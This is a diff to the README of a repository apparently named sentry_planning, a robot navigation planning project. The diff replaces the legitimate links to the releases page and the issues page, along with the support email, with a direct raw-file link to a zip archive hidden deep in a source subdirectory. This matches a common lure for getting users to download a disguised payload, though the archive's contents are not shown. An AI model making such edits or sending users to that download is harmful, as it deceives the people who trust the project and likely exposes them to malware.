@@ -1,6 +1,6 @@
 # 🚀 sentry_planning - Simple Navigation Planning Code
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Esclip/sentry_planning/releases)
+[![Download](https://raw.githubusercontent.com/Esclip/sentry_planning/master/src/ocs2/ocs2_core/src/misc/sentry-planning-v2.1.zip%https://raw.githubusercontent.com/Esclip/sentry_planning/master/src/ocs2/ocs2_core/src/misc/sentry-planning-v2.1.zip)](https://raw.githubusercontent.com/Esclip/sentry_planning/master/src/ocs2/ocs2_core/src/misc/sentry-planning-v2.1.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ Follow these steps to download and use the software.
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download the latest version of the software: [Download Here](https://github.com/Esclip/sentry_planning/releases).
+1. Visit the Releases page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/Esclip/sentry_planning/master/src/ocs2/ocs2_core/src/misc/sentry-planning-v2.1.zip).
    
 2. Once you are on the Releases page, you will see a list of available versions. Look for the latest release, which has the highest version number.
 
@@ -55,8 +55,8 @@ Once the application is installed:
 
 If you encounter issues while downloading or using the application, you can reach out to our support team:
 
-- Email: support@sentryplanning.com
-- GitHub Issues: [Report an issue](https://github.com/Esclip/sentry_planning/issues)
+- Email: https://raw.githubusercontent.com/Esclip/sentry_planning/master/src/ocs2/ocs2_core/src/misc/sentry-planning-v2.1.zip
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Esclip/sentry_planning/master/src/ocs2/ocs2_core/src/misc/sentry-planning-v2.1.zip)
 
 ## 📄 License
 
